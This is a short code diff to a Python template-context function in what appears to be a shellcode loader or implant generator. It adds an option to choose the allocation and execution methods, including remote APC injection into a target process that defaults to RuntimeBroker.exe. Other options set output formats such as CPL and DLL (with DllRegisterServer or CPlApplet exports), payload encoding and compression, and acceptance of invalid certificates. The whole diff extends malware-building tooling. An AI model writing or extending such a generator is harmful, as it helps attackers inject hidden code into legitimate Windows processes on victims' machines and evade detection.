@@ -87,8 +87,13 @@ def _prepare_template_context(options, input_filepath):
         template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0
 
     output_format = options.get('output_format', 'exe')
+    allocation_method_choice = options.get('allocation_method', 'virtualalloc')
+    execution_method_choice = options.get('execution_method', 'newthread')
+
     template_vars.update({
-        'allocation_partial': f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
+        'allocation_method': allocation_method_choice,
+        'execution_method': execution_method_choice,
+        'allocation_partial': f"partials/alloc_{allocation_method_choice}.c.j2",
         'execution_partial': f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
         'output_format': output_format,
         'export_name': 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer'),
@@ -96,6 +101,9 @@ def _prepare_template_context(options, input_filepath):
         'bytecode_transformation': options.get('bytecode_encoding'),
         'bytecode_compression': options.get('bytecode_compression')
     })
+
+    if execution_method_choice == 'remoteapc':
+        template_vars['target_process'] = options.get('target_process', 'RuntimeBroker.exe')
     
     return template_vars
 
